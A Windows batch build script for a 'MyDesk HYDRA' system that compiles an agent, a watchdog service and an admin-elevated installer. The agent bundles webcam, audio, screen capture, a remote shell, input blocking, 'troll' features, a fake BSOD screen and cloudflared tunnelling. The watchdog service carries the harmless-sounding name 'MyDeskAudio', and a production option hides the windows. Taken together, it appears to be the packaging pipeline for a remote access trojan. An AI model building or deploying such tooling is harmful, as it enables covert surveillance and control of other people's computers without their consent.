@echo off
setlocal
cd /d "%~dp0.."

echo ==========================================
echo       MyDesk HYDRA BUILD SYSTEM
echo ==========================================

:: --- CONFIGURATION ---
:: Set to 'false' for production (Windowed/Hidden), 'true' for Debugging (Console)
set USE_CONSOLE=true
:: Set to 'true' to keep build folder and .spec files (Incremental Build)
set ENABLE_CACHE=false
:: ---------------------

:: Determine Console Flag
if /i "%USE_CONSOLE%"=="true" (
    set CONSOLE_FLAG=--console
) else (
    set CONSOLE_FLAG=--noconsole
)

:: Check for Cache Argument
if /i "%1"=="--cache" set ENABLE_CACHE=true

echo [*] Build Configuration:
echo     - Console Mode: %USE_CONSOLE% (%CONSOLE_FLAG%)
echo     - Cache Mode:   %ENABLE_CACHE%
echo.

:: 0. Syntax Check
echo [*] Checking Syntax (compileall)...
python -m compileall -q .
if %errorlevel% neq 0 (
    echo [!] Syntax Error Detected! Build Aborted.
    exit /b 1
)

:: 1. Cleanup build artifacts
:: 1. Cleanup build artifacts
if /i "%ENABLE_CACHE%"=="true" (
    echo [*] Cache Mode ENABLED: Skipping cleanup of 'build' and '.spec' files.
) else (
    echo [*] Cleaning build artifacts...
    if exist build (
        rmdir /s /q build || (
            echo [!] Failed to remove build folder! Build Aborted.
            exit /b 1
        )
        echo [*] Removed build folder.
    )

    REM Remove .spec files
    del /q *.spec 2>nul
    echo [*] Removed .spec files.
)

:: Clean dist folder
if exist dist (
    rmdir /s /q dist || (
        echo [!] Failed to remove dist folder! Build Aborted.
        exit /b 1
    )
    mkdir dist || (
        echo [!] Failed to create dist folder after cleanup! Build Aborted.
        exit /b 1
    )
    echo [*] Cleaned up dist folder.
) else (
    mkdir dist || (
        echo [!] Failed to create dist folder! Build Aborted.
        exit /b 1
    )
    echo [*] Created dist folder.
)
:: 2. Build AGENT (Copied from build_all.bat)
echo [*] Building 1/3: MyDeskAgent.exe...
python -m PyInstaller %CONSOLE_FLAG% --onefile --noupx --name MyDeskAgent ^
    --exclude-module matplotlib --exclude-module pandas ^
    --exclude-module scipy --exclude-module PyQt6 ^
    --exclude-module torch --exclude-module streamlit ^
    --exclude-module altair --exclude-module chess ^
    --exclude-module flask --exclude-module selenium --exclude-module sklearn ^
    --exclude-module pyarrow --exclude-module ipython --exclude-module jupyter ^
    --exclude-module google ^
    --exclude-module pywinauto --exclude-module uiautomation ^
    --exclude-module nodriver --exclude-module pynput --exclude-module dxcam ^
    --exclude-module pillow_jxl --exclude-module zstandard ^
    --exclude-module test --exclude-module unittest ^
    --hidden-import=targets.input_controller ^
    --hidden-import=targets.capture ^
    --hidden-import=targets.audio ^
    --hidden-import=targets.webcam ^
    --hidden-import=targets.auditor ^
    --hidden-import=targets.shell_handler ^
    --hidden-import=targets.process_manager ^
    --hidden-import=targets.file_manager ^
    --hidden-import=targets.clipboard_handler ^
    --hidden-import=targets.device_settings ^
    --hidden-import=targets.troll_handler ^
    --hidden-import=targets.troll_video_player ^
    --hidden-import=targets.bsod_screen ^
    --hidden-import=targets.webrtc_handler ^
    --hidden-import=targets.webrtc_tracks ^
    --hidden-import=targets.resource_manager ^
    --hidden-import=targets.tunnel_manager ^
    --hidden-import=targets.input_blocker ^
    --hidden-import=pyaudiowpatch ^
    --hidden-import=aiortc --hidden-import=aiortc.codecs ^
    --hidden-import=aiortc.codecs.h264 --hidden-import=aiortc.contrib.media ^
    --hidden-import=av --hidden-import=av.video --hidden-import=av.audio ^
    --hidden-import=numpy ^
    --hidden-import=msgpack ^
    --hidden-import=PIL.Image ^
    --hidden-import=cv2 ^
    --hidden-import=psutil ^
    --hidden-import=pywintypes ^
    --hidden-import=win32api ^
    --hidden-import=cryptography ^
    --collect-all aiortc ^
    --collect-all av ^
    --add-data "targets;targets" ^
    agent_loader.py

if %errorlevel% neq 0 (
    echo [!] Agent Build Failed!
    exit /b %errorlevel%
)

:: Copy Cloudflared
echo [*] Copying Cloudflared...
if exist "cloudflared.exe" (
    copy /Y "cloudflared.exe" "dist\cloudflared.exe"
) else (
    echo [!] WARNING: cloudflared.exe not found!
)

@REM :: 3. Build Service Shield (MyDeskAudio)
echo.
echo [*] Building 2/3: MyDeskAudio.exe...
python -m PyInstaller %CONSOLE_FLAG% --onefile --name MyDeskAudio ^
    --hidden-import win32timezone ^
    --hidden-import servicemanager ^
    --hidden-import targets.protection ^
    --hidden-import pywintypes ^
    --hidden-import win32api ^
    targets/services/watcher.py
if %errorlevel% neq 0 (
    echo [!] Service Shield Build Failed!
    exit /b %errorlevel%
)
@REM :: 5. Build Setup Bundle
echo.
echo [*] Building 3/3: MyDeskSetup.exe (Installer)...
python -m PyInstaller --onefile %CONSOLE_FLAG% --name MyDeskSetup --uac-admin ^
    --add-binary "dist/MyDeskAgent.exe;." ^
    --add-binary "dist/MyDeskAudio.exe;." ^
    targets/services/install.py

if %errorlevel% neq 0 (
    echo [!] Installer Build Failed!
    exit /b %errorlevel%
)

echo.
echo ==========================================
echo         HYDRA BUILD COMPLETE!
echo ==========================================
echo Output: dist\MyDeskSetup.exe
echo.
